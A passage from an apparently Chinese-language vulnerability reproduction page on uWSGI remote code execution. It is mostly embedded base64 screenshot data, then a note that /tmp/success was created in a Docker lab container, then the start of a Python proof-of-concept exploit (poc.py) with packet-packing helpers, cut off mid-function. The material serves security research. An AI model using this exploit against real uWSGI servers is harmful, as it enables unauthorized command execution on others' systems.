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" width="560px" /></p><p>执行docker-compose exec web bash进入容器，可见/tmp/success已经成功执行：</p><p><img height="89px" src="data:image/png;base64,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" width="372px" /></p><p>poc.py</p><p>#!/usr/bin/python<br /># coding: utf-8<br />######################<br /># Uwsgi RCE Exploit<br />######################<br /># Author: wofeiwo@80sec.com<br /># Created: 2017-7-18<br /># Last modified: 2018-1-30<br /># Note: Just for research purpose<br /><br />import sys<br />import socket<br />import argparse<br />import requests<br /><br />def sz(x):<br />    s = hex(x if isinstance(x, int) else len(x))[2:].rjust(4, '0')<br />    s = bytes.fromhex(s) if sys.version_info[0] == 3 else s.decode('hex')<br />    return s[::-1]<br /><br /><br />def pack_uwsgi_vars(var):<br />    pk = b''<br />    for k, v in var.items() if hasattr(var, 'items') else var:<br />        pk += sz(k) + k.encode('utf8') + sz(v) + v.encode('utf8')<br />    result = b'\x00' + sz(pk) + b'\x00' + pk<br />    return result<br /><br /><br />def parse_addr(addr, default_port=None):<br />    port = default_port<br />    if isinstance(addr, str):<br />        if addr.isdigit():<br />            addr, port = '', addr<br />        elif ':' in addr:<br />            addr, _, port = addr.partition(':')<br />    elif isinstance(addr, (list, tuple, set)):<br />        addr, port = addr<br />    port = int(port) if port else port<br />    return (addr or '127.0.0.1', port)<br /><br /><br />def get_host_from_url(url):<br />    if '//' in url:<br />        url = url.split('//', 